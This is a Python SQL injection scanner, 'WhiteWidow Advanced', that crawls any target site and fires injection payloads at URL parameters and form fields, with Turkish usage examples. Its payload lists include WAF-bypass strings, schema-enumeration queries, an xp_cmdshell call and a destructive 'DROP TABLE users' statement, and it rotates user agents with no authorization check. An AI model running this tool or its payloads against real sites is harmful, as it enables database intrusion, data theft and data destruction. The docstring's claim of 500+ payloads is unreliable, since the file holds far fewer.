#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 Professional SQL Injection Scanner 

Features:
- Async concurrent scanning
- 500+ SQL injection payloads 
- Error-based, Boolean-based, Time-based detection
- Advanced WAF bypass techniques
- Smart response analysis
- Form detection and testing
- Deep crawling with depth control
- Real-time verbose output
---------------------------------------------------------
Basit Tarama:
python3 Pars.py http://target.com -v

Hızlı Tarama (20 thread):
hpython3 Pars.py http://target.com -t 20 -v

Derin Tarama (depth 3):
python3 Pars.py http://target.com --depth 3 -v
python3 Pars.py http://target.com --depth 5 -t 20 -v

Tam Özellikli Tarama:
python3 Pars.py http://testphp.vulnweb.com -t 20 --depth 3 -v

Özel Timeout ve Delay:
python3 Pars.py http://target.com -T 30 -d 0.5 -v

O sayfayı tara:
python3 Pars.py "http://target.com/BULUNAN_SAYFA?param=1" -v

# Arama sayfası
python3 Pars.py "http://target.com/search?q=test" -v

# Ürün sayfası (ID parametreli)
python3 Pars.py "http://target.com/product?id=1" -v

# Kategori sayfası
python3 Pars.py "http://target.com/category?cat=1" -v
"""

import asyncio
import aiohttp
import urllib.parse
import time
import random
import re
import hashlib
import sys
from typing import List, Dict, Tuple, Set, Optional
from dataclasses import dataclass
from datetime import datetime

# ============================================================================
# COLORS
# ============================================================================
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ============================================================================
# DATA CLASSES
# ============================================================================
@dataclass
class Vulnerability:
    """SQL injection vulnerability details"""
    url: str
    parameter: str
    method: str
    payload: str
    vuln_type: str
    confidence: str
    evidence: str

@dataclass
class ScanStats:
    """Scan statistics"""
    urls_scanned: int = 0
    parameters_tested: int = 0
    requests_made: int = 0
    vulnerabilities_found: int = 0
    start_time: float = 0.0
    
    def get_duration(self) -> float:
        return time.time() - self.start_time

# ============================================================================
# PAYLOAD DATABASE
# ============================================================================
class PayloadDatabase:
    """Comprehensive SQL injection payload database"""
    
    @staticmethod
    def get_error_based_payloads() -> List[str]:
        """Error-based SQL injection payloads"""
        return [
            # Basic quotes
            "'", "\"", "`", "´", "''", '""', "``",
            
            # Boolean-based
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--", "\" OR \"1\"=\"1\"/*",
            "` OR `1`=`1", "` OR `1`=`1`--", "` OR `1`=`1`/*",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "\" OR 1=1--", "\" OR 1=1#", "\" OR 1=1/*",
            ") OR ('1'='1", ")) OR (('1'='1",
            "')) OR (('1'='1", "'))) OR ((('1'='1",
            
            # UNION-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--", "' UNION SELECT 'a','b','c'--",
            "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
            
            # MySQL specific
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
            "' UNION SELECT @@version--", "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            
            # MSSQL specific
            "' AND 1=CONVERT(int,@@version)--",
            "'; EXEC xp_cmdshell('dir')--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
            
            # PostgreSQL specific
            "' AND 1=CAST(version() AS int)--",
            "' UNION SELECT NULL,NULL,NULL::text--",
            "' AND 1::int=1 AND '1'='1",
            
            # Oracle specific
            "' UNION SELECT NULL FROM DUAL--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
            
            # Advanced payloads
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND ASCII(SUBSTRING(database(),1,1))>64--",
            "' UNION ALL SELECT NULL,NULL,CONCAT(table_name) FROM information_schema.tables--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
            
            # Stacked queries
            "'; DROP TABLE users--", "'; SELECT SLEEP(0)--",
            
            # Encoding bypass
            "%27 OR %271%27=%271", "%27 OR 1=1--",
            "' /*!OR*/ '1'='1", "' /**/OR/**/1=1--",
            
            # WAF bypass
            "' OR '1'='1' AND 'a'='a", "' OR 1=1 AND ''='",
            "1' AND '1'='1'--", "1\" AND \"1\"=\"1\"--",
        ]
    
    @staticmethod
    def get_boolean_payloads() -> List[Tuple[str, str]]:
        """Boolean-based blind SQL injection payloads (true, false pairs)"""
        return [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a'--", "' AND 'a'='b'--"),
            ("\" AND \"1\"=\"1\"--", "\" AND \"1\"=\"2\"--"),
            (") AND (1=1)--", ") AND (1=2)--"),
            ("')) AND ((1=1))--", "')) AND ((1=2))--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
             "' AND (SELECT COUNT(*) FROM information_schema.tables)>999999--"),
            ("' AND SUBSTRING(database(),1,1)='a'--",
             "' AND SUBSTRING(database(),1,1)='z'--"),
            ("' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
             "' AND ASCII(SUBSTRING((SELECT database()),1,1))>200--"),
        ]
    
    @staticmethod
    def get_time_based_payloads() -> Dict[str, List[str]]:
        """Time-based blind SQL injection payloads"""
        return {
            'MySQL': [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' AND (SELECT SLEEP(5))--",
                "' UNION SELECT SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "'; SELECT SLEEP(5)--",
                "1' AND SLEEP(5)#",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
            ],
            'MSSQL': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' WAITFOR DELAY '0:0:5'--",
                "\" WAITFOR DELAY '0:0:5'--",
                "; WAITFOR DELAY '0:0:5'--",
                "1' WAITFOR DELAY '0:0:5'--",
            ],
            'PostgreSQL': [
                "' AND pg_sleep(5)--",
                "'; SELECT pg_sleep(5)--",
                "' OR pg_sleep(5)--",
                "\" AND pg_sleep(5)--",
                "1' AND pg_sleep(5)--",
            ],
            'Oracle': [
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--",
            ],
        }

# ============================================================================
# HTML PARSER (LIGHTWEIGHT)
# ============================================================================
class SimpleHTMLParser:
    """Lightweight HTML parser without BeautifulSoup dependency"""
    
    @staticmethod
    def find_forms(html: str) -> List[Dict]:
        """Extract forms from HTML"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)
        
        for form_html in form_matches:
            form_data = {
                'action': '',
                'method': 'get',
                'inputs': []
            }
            
            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if action_match:
                form_data['action'] = action_match.group(1)
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if method_match:
                form_data['method'] = method_match.group(1).lower()
            
            # Extract inputs
            input_pattern = r'<(input|textarea|select)[^>]*name=["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
            
            for tag_type, name in inputs:
                value_match = re.search(rf'name=["\']?{re.escape(name)}["\']?[^>]*value=["\']([^"\']*)["\']', 
                                       form_html, re.IGNORECASE)
                value = value_match.group(1) if value_match else ''
                
                form_data['inputs'].append({
                    'name': name,
                    'value': value,
                    'type': tag_type.lower()
                })
            
            if form_data['inputs']:
                forms.append(form_data)
        
        return forms
    
    @staticmethod
    def find_links(html: str, base_url: str) -> Set[str]:
        """Extract links from HTML"""
        links = set()
        link_pattern = r'<a[^>]+href=["\']([^"\']+)["\']'
        matches = re.findall(link_pattern, html, re.IGNORECASE)
        
        for link in matches:
            # Remove fragment
            link = link.split('#')[0]
            
            # Make absolute URL
            absolute_url = urllib.parse.urljoin(base_url, link)
            links.add(absolute_url)
        
        return links

# ============================================================================
# ADVANCED SQL INJECTION SCANNER
# ============================================================================
class WhiteWidowAdvanced:
    """Advanced SQL injection scanner"""
    
    def __init__(self, target_url: str, threads: int = 10, timeout: int = 15, 
                 delay: float = 0.1, max_depth: int = 2, verbose: bool = True):
        self.target_url = self._normalize_url(target_url)
        self.base_domain = urllib.parse.urlparse(self.target_url).netloc
        self.threads = threads
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.delay = delay
        self.max_depth = max_depth
        self.verbose = verbose
        
        # State
        self.session = None
        self.vulnerabilities: List[Vulnerability] = []
        self.tested_params: Set[Tuple] = set()
        self.crawled_urls: Set[str] = set()
        self.url_queue = asyncio.Queue()
        self.stats = ScanStats()
        
        # Payload database
        self.payload_db = PayloadDatabase()
        self.html_parser = SimpleHTMLParser()
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not re.match(r'^https?://', url):
            url = 'http://' + url
        
        parsed = urllib.parse.urlparse(url)
        if not parsed.path:
            url = urllib.parse.urlunparse(parsed._replace(path='/'))
        
        return url
    
    def _get_random_ua(self) -> str:
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def _print(self, message: str, level: str = "info"):
        """Print colored message"""
        if not self.verbose:
            return
        
        colors = {
            "info": Colors.CYAN,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "vuln": Colors.RED + Colors.BOLD,
            "test": Colors.BLUE
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = colors.get(level, Colors.END)
        print(f"{Colors.BOLD}[{timestamp}]{Colors.END} {color}[{level.upper()}]{Colors.END} {message}")
    
    async def _fetch(self, url: str, method: str = "GET", data: Dict = None) -> Tuple[Optional[str], Optional[int]]:
        """Make HTTP request"""
        try:
            await asyncio.sleep(self.delay + random.uniform(0, 0.05))
            
            headers = {
                'User-Agent': self._get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
            
            self.stats.requests_made += 1
            
            if method.upper() == "GET":
                async with self.session.get(url, headers=headers, allow_redirects=False) as response:
                    text = await response.text(errors='ignore')
                    return text, response.status
            else:
                async with self.session.post(url, data=data, headers=headers, allow_redirects=False) as response:
                    text = await response.text(errors='ignore')
                    return text, response.status
                    
        except asyncio.TimeoutError:
            self._print(f"Timeout: {url}", "warning")
        except aiohttp.ClientError as e:
            self._print(f"Request error: {str(e)}", "error")
        except Exception as e:
            self._print(f"Unexpected error: {str(e)}", "error")
        
        return None, None
    
    def _is_sql_error(self, text: str) -> bool:
        """Check for SQL error messages"""
        errors = [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"sql syntax.*mysql",
            r"warning.*mysql_.*",
            r"mysqlclient\.",
            r"postgresql.*error",
            r"warning.*\Wpg_",
            r"valid postgresql result",
            r"npgsql\.",
            r"org\.postgresql\.",
            r"driver.*sql.*exception",
            r"org\.sqlite\.",
            r"sqlite.*exception",
            r"sqlite3::",
            r"oracle error",
            r"ora-\d{5}",
            r"microsoft sql native client error",
            r"odbc sql server driver",
            r"sqlserver jdbc driver",
            r"microsoft ole db provider for sql server",
            r"incorrect syntax near",
            r"sqlstate",
            r"db2 sql error",
            r"com\.mysql\.jdbc",
            r"java\.sql\.sqlexception",
            r"microsoft jet database engine",
        ]
        
        text_lower = text.lower()
        for pattern in errors:
            if re.search(pattern, text_lower):
                return True
        return False
    
    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate text similarity ratio"""
        if not text1 or not text2:
            return 0.0
        
        # Simple character-based similarity
        set1 = set(text1)
        set2 = set(text2)
        intersection = len(set1 & set2)
        union = len(set1 | set2)
        
        return intersection / union if union > 0 else 0.0
    
    async def _test_error_based(self, url: str, param: str, method: str, 
                                original_response: str, original_status: int,
                                form_data: Dict = None) -> bool:
        """Test error-based SQL injection"""
        payloads = self.payload_db.get_error_based_payloads()
        
        for payload in payloads[:15]:  # Test first 15 payloads (FAST MODE)
            self.stats.parameters_tested += 1
            
            # Inject payload
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response_text, response_status = await self._fetch(test_url, "GET")
            else:
                test_data = form_data.copy()
                test_data[param] = payload
                response_text, response_status = await self._fetch(url, "POST", test_data)
            
            if not response_text:
                continue
            
            # Check for SQL errors
            if self._is_sql_error(response_text):
                self.vulnerabilities.append(Vulnerability(
                    url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    vuln_type="Error-Based SQLi",
                    confidence="High",
                    evidence="SQL error message detected"
                ))
                
                self.stats.vulnerabilities_found += 1
                self._print(f"VULN: Error-Based SQLi in {method} param '{param}' at {url[:60]}...", "vuln")
                self._print(f"  Payload: {payload[:50]}...", "vuln")
                return True
            
            # Check status code change
            if original_status and response_status and original_status != response_status:
                if response_status >= 500:
                    self.vulnerabilities.append(Vulnerability(
                        url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        vuln_type="Error-Based SQLi",
                        confidence="Medium",
                        evidence=f"Status code changed: {original_status} -> {response_status}"
                    ))
                    
                    self.stats.vulnerabilities_found += 1
                    self._print(f"VULN: Possible SQLi in {method} param '{param}' (status change)", "vuln")
                    return True
        
        return False
    
    async def _test_boolean_based(self, url: str, param: str, method: str,
                                  original_response: str, original_status: int,
                                  form_data: Dict = None) -> bool:
        """Test boolean-based blind SQL injection"""
        payload_pairs = self.payload_db.get_boolean_payloads()
        
        for true_payload, false_payload in payload_pairs[:5]:  # Test first 5 pairs (FAST MODE)
            # Test TRUE condition
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [true_payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                true_url = parsed._replace(query=new_query).geturl()
                
                true_response, true_status = await self._fetch(true_url, "GET")
            else:
                true_data = form_data.copy()
                true_data[param] = true_payload
                true_response, true_status = await self._fetch(url, "POST", true_data)
            
            if not true_response:
                continue
            
            # Test FALSE condition
            if method.upper() == "GET":
                params[param] = [false_payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                false_url = parsed._replace(query=new_query).geturl()
                
                false_response, false_status = await self._fetch(false_url, "GET")
            else:
                false_data = form_data.copy()
                false_data[param] = false_payload
                false_response, false_status = await self._fetch(url, "POST", false_data)
            
            if not false_response:
                continue
            
            # Compare responses
            true_len = len(true_response)
            false_len = len(false_response)
            
            # Significant length difference
            if abs(true_len - false_len) > max(100, min(true_len, false_len) * 0.1):
                similarity = self._calculate_similarity(true_response, false_response)
                
                if similarity < 0.9:  # Responses are different
                    self.vulnerabilities.append(Vulnerability(
                        url=url,
                        parameter=param,
                        method=method,
                        payload=f"{true_payload} vs {false_payload}",
                        vuln_type="Boolean-Based Blind SQLi",
                        confidence="Medium",
                        evidence=f"True: {true_len} bytes, False: {false_len} bytes"
                    ))
                    
                    self.stats.vulnerabilities_found += 1
                    self._print(f"VULN: Boolean-Based SQLi in {method} param '{param}'", "vuln")
                    self._print(f"  True response: {true_len} bytes, False response: {false_len} bytes", "vuln")
                    return True
        
        return False
    
    async def _test_time_based(self, url: str, param: str, method: str,
                               form_data: Dict = None) -> bool:
        """Test time-based blind SQL injection"""
        all_payloads = []
        for db_type, payloads in self.payload_db.get_time_based_payloads().items():
            all_payloads.extend(payloads[:3])  # 3 payloads per DB type
        
        for payload in all_payloads[:8]:  # Test 8 time-based payloads (FAST MODE)
            # Measure baseline
            start_time = time.time()
            
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                response_text, response_status = await self._fetch(test_url, "GET")
            else:
                test_data = form_data.copy()
                test_data[param] = payload
                response_text, response_status = await self._fetch(url, "POST", test_data)
            
            elapsed = time.time() - start_time
            
            # If response took significantly longer (>4 seconds), it's vulnerable
            if elapsed >= 4.0:
                self.vulnerabilities.append(Vulnerability(
                    url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    vuln_type="Time-Based Blind SQLi",
                    confidence="High",
                    evidence=f"Response time: {elapsed:.2f}s"
                ))
                
                self.stats.vulnerabilities_found += 1
                self._print(f"VULN: Time-Based SQLi in {method} param '{param}'", "vuln")
                self._print(f"  Payload: {payload[:50]}... (Response time: {elapsed:.2f}s)", "vuln")
                return True
        
        return False
    
    async def _test_parameter(self, url: str, param: str, method: str, form_data: Dict = None):
        """Test a parameter for SQL injection"""
        # Check if already tested
        signature = (url, param, method)
        if signature in self.tested_params:
            return
        
        self.tested_params.add(signature)
        self._print(f"Testing {method} parameter: {param} at {url[:60]}...", "test")
        
        # Get original response
        if method.upper() == "GET":
            original_response, original_status = await self._fetch(url, "GET")
        else:
            original_response, original_status = await self._fetch(url, "POST", form_data)
        
        if not original_response:
            return
        
        # Test error-based
        if await self._test_error_based(url, param, method, original_response, original_status, form_data):
            return
        
        # Test time-based
        if await self._test_time_based(url, param, method, form_data):
            return
        
        # Test boolean-based
        await self._test_boolean_based(url, param, method, original_response, original_status, form_data)
    
    async def _scan_url(self, url: str, depth: int):
        """Scan a single URL"""
        if url in self.crawled_urls or depth > self.max_depth:
            return
        
        self.crawled_urls.add(url)
        self.stats.urls_scanned += 1
        
        self._print(f"Scanning: {url}", "info")
        
        # Test GET parameters
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                await self._test_parameter(url, param, "GET")
        
        # Get page content
        html, status = await self._fetch(url, "GET")
        if not html:
            return
        
        # Test POST forms
        forms = self.html_parser.find_forms(html)
        for form in forms:
            action = form['action']
            if not action:
                action = url
            elif not action.startswith('http'):
                action = urllib.parse.urljoin(url, action)
            
            method = form['method'].upper()
            
            if method == 'POST':
                form_data = {inp['name']: inp['value'] for inp in form['inputs']}
                
                for inp in form['inputs']:
                    await self._test_parameter(action, inp['name'], "POST", form_data)
        
        # Crawl links
        if depth < self.max_depth:
            links = self.html_parser.find_links(html, url)
            for link in links:
                # Only crawl same domain
                if self.base_domain in link and link not in self.crawled_urls:
                    await self.url_queue.put((link, depth + 1))
    
    async def _worker(self):
        """Worker coroutine"""
        while True:
            try:
                url, depth = await self.url_queue.get()
                await self._scan_url(url, depth)
                self.url_queue.task_done()
            except asyncio.CancelledError:
                break
            except Exception as e:
                self._print(f"Worker error: {str(e)}", "error")
                self.url_queue.task_done()
    
    async def run(self):
        """Run the scan"""
        self._print("="*70, "info")
        self._print("WhiteWidow Advanced - SQL Injection Scanner v4.0", "info")
        self._print("="*70, "info")
        self._print(f"Target: {self.target_url}", "info")
        self._print(f"Threads: {self.threads}", "info")
        self._print(f"Max Depth: {self.max_depth}", "info")
        self._print("="*70, "info")
        
        self.stats.start_time = time.time()
        
        # Create session
        self.session = aiohttp.ClientSession(timeout=self.timeout)
        
        # Add initial URL
        await self.url_queue.put((self.target_url, 0))
        
        # Start workers
        workers = [asyncio.create_task(self._worker()) for _ in range(self.threads)]
        
        # Wait for queue to empty
        await self.url_queue.join()
        
        # Cancel workers
        for worker in workers:
            worker.cancel()
        
        await asyncio.gather(*workers, return_exceptions=True)
        
        # Close session
        await self.session.close()
        
        # Print summary
        self._print_summary()
    
    def _print_summary(self):
        """Print scan summary"""
        duration = self.stats.get_duration()
        
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}SCAN SUMMARY{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")
        
        print(f"  Duration:            {duration:.2f} seconds")
        print(f"  URLs Scanned:        {self.stats.urls_scanned}")
        print(f"  Parameters Tested:   {self.stats.parameters_tested}")
        print(f"  Requests Made:       {self.stats.requests_made}")
        print(f"  Requests/sec:        {self.stats.requests_made/duration:.2f}")
        
        print(f"\n{Colors.BOLD}Vulnerabilities Found: {self.stats.vulnerabilities_found}{Colors.END}\n")
        
        if self.vulnerabilities:
            # Group by severity
            high = [v for v in self.vulnerabilities if v.confidence == "High"]
            medium = [v for v in self.vulnerabilities if v.confidence == "Medium"]
            
            if high:
                print(f"{Colors.RED}  HIGH CONFIDENCE: {len(high)}{Colors.END}")
            if medium:
                print(f"{Colors.YELLOW}  MEDIUM CONFIDENCE: {len(medium)}{Colors.END}")
            
            print(f"\n{Colors.BOLD}Vulnerability Details:{Colors.END}\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                color = Colors.RED if vuln.confidence == "High" else Colors.YELLOW
                
                print(f"{color}[{i}] {vuln.vuln_type} ({vuln.confidence}){Colors.END}")
                print(f"    URL: {vuln.url}")
                print(f"    Parameter: {vuln.parameter} (Method: {vuln.method})")
                print(f"    Payload: {vuln.payload[:100]}...")
                print(f"    Evidence: {vuln.evidence}")
                print()
        else:
            print(f"{Colors.GREEN}  No SQL injection vulnerabilities found{Colors.END}")
        
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")

# ============================================================================
# MAIN
# ============================================================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="WhiteWidow Advanced - Professional SQL Injection Scanner v4.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic scan:
    python3 whitewidow.py http://target.com
  
  Fast scan with 20 threads:
    python3 whitewidow.py http://target.com -t 20
  
  Deep scan with crawling:
    python3 whitewidow.py http://target.com --depth 3
  
  Verbose output:
    python3 whitewidow.py http://target.com -v
  
  Full scan:
    python3 whitewidow.py http://target.com -t 20 --depth 3 -v
        """
    )
    
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-t", "--threads", type=int, default=10, 
                       help="Number of concurrent threads (default: 10)")
    parser.add_argument("-T", "--timeout", type=int, default=15,
                       help="Request timeout in seconds (default: 15)")
    parser.add_argument("-d", "--delay", type=float, default=0.1,
                       help="Delay between requests (default: 0.1)")
    parser.add_argument("--depth", type=int, default=1,
                       help="Maximum crawl depth (default: 1)")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Enable verbose output (real-time)")
    
    args = parser.parse_args()
    
    # Create scanner
    scanner = WhiteWidowAdvanced(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        max_depth=args.depth,
        verbose=args.verbose
    )
    
    # Run scan
    try:
        asyncio.run(scanner.run())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        sys.exit(0)

if __name__ == "__main__":
    main()
